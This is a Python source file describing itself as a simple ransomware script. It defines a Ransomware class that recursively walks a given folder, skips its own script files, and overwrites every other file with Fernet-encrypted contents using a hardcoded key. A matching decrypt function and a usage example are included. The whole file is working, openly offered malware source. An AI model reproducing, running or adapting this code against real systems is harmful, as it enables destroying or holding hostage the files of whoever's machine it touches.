"""
This is a simple ransomware script that encrypts all files in a folder and its subfolders.

:Usage:
    ::

        from ransomware import Ransomware

        ransomware = Ransomware()
        ransomware.encrypt_files_in_folder("path/to/folder")
        ransomware.decrypt_files_in_folder("path/to/folder")

"""

from pathlib import Path

try:
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    print(
        "Please install the cryptography module using the command: pip install cryptography"
    )
    exit(0)

red = "\033[91m"
blue = "\033[94m"


class Ransomware:
    def __init__(self):
        self.__secret_password = "11092005"
        self.__secret_key = "ZTDagi0tH9njbS7ErAnZb1SSIYNHixW532VrJR7p-F8="

    @property
    def password(self):
        return self.__secret_password

    @password.setter
    def password(self, passwd: str):
        self.__secret_password = passwd

    @property
    def key(self) -> str | bytes:
        return self.__secret_key

    @key.setter
    def key(self, key: str | bytes):
        self.__secret_key = key

    def generate_key(self) -> str:
        return Fernet.generate_key()

    def __process_file(self, file_path: str, key: str | bytes, mode: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            if mode == "encrypt":
                processed_data = Fernet(key).encrypt(data)
            elif mode == "decrypt":
                processed_data = Fernet(key).decrypt(data)

            with open(file_path, "wb") as f:
                f.write(processed_data)

            return True

        except Exception as e:
            print(f"{red}{e}")
            return False

    def __process_files_in_folder(self, folder_path: str, mode: str) -> None:
        try:
            all_paths = Path(folder_path).rglob("*")
            for current_path in all_paths:
                if (
                    "ransomware.py" in current_path.name
                    or "main.py" in current_path.name
                ):
                    continue
                if current_path.is_file():
                    if self.__process_file(current_path, self.__secret_key, mode):
                        print(f"\n{blue}Successfully {mode}ed {current_path}")
                    else:
                        print(f"{red}Failed to {mode} {current_path}")
        except Exception as e:
            print(f"{red}{e}")

    def encrypt_files_in_folder(self, folder_path: str) -> None:
        self.__process_files_in_folder(folder_path, "encrypt")

    def decrypt_files_in_folder(self, folder_path: str) -> None:
        self.__process_files_in_folder(folder_path, "decrypt")
